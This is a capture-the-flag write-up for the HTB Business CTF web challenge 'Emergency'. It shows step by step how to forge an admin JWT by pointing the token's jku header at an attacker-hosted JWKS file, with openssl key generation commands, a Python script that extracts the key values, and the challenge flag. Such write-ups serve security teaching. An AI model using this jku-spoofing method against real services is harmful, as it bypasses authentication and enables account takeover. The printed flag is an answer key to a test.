web / Emergency
===============
(htb\_business ctf)

### Description:
You've been tasked with a pentesting engagement on a hospital management portal, they've provided you with a mockup build of the website and they've asked you to break their JWT implementation and find a way to login as "admin".


# solution:
## setup

The challenge seems pretty straight forward, as the description says you have a jwt token (as a cookie). Using [jwt.io](https://jwt.io) we can decode this token and get the following contents:

header:
```json
{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://localhost/.well-known/jwks.json",
  "kid": "7959946c-e36d-41eb-ba69-bd9f84f9c972"
}
```
payload:
```json
{
  "username": "admin",
  "iat": 1627059136,
  "exp": 1627080736
}
```
NOTE: I have changed the `username` to admin (because the challenge requires us to login as admin) and I have changed the `exp` to a larger number so the cookie doesnt expire anytime soon.

<br />
<br />

One thing that stands out is the value `jku` which maps to a url. According to documentation jku should point to a public key that is used to verify the authenticity of the jwt token. 

<br />

Changing `localhost` to the server address we get this:
```json
{
  "keys": [
    {
      "alg": "RS256",
      "e": "65537",
      "kid": "7959946c-e36d-41eb-ba69-bd9f84f9c972",
      "kty": "RSA",
      "n": "23628058212268181192701544008552088099768761203632348187712899758478492958694064043925763094334068334076924851473068432729079599248406772781535695526601252330477513671371344512622770591822192900892177562387867655618785947779899335867521561135606298219164490554468258070675301620571276113707867757177685921959350142814739338886487966178810253030273817269666554889499780372692793030835275133693682057185594609824411145242248385966907046136709684480867973269483592763659358136729616774124415054393287145987209093379565696926699953454370680366517904624833525268486825866236659364734168132964964014339179347807986567944639",
      "use": "sig"
    }
  ]
}
```


## The bug

The above mentioned jku value should never be trusted indefinately and the server should only ever reach out to trusted addresses to get the jku value. However this server doesnt do that.


## The exploit
We need to create our own jwt whose jku value points to our server.

First we need a public and private key pair for signing the token. This can be done with the following commands:
```
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
If everything worked, then the commands created a couple files. Out of these `pkcs8.key` is our private key and `publickey.crt` is our public key.

<br />
<br />


Second we need to host our public key on a webserver. We can download the original `jwks.json` file from the server with wget:
```
wget http://<server_address:port>/.well-known/jwks.json
```
Then we use the following python script to generate the `n` and `e` value for the token.
```py
#!/usr/bin/env python3

from Crypto.PublicKey import RSA

fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()

print("n:", key.n)
print("e:", key.e)
```

Next replace the values `n` and `e` in the `jwks.json` file we downloaded, and upload it to a webserver.


<br/>
<br/>

Finnally we need to modify our jwt token. On [jwt.io](https://jwt.io) add the decoded header, and payload that we got from the original jwt token. Change the `jku` value to point to your domain, and add your public and private key at the bottom.

It should look something like this:
[picture of jwt.io](githib url)


<br/>
Set the generated token as your cookie, and make a request to the server. You should see the flag at the top of the screen.
```
HTB{your_JWTS_4r3_cl41m3d!!}
```
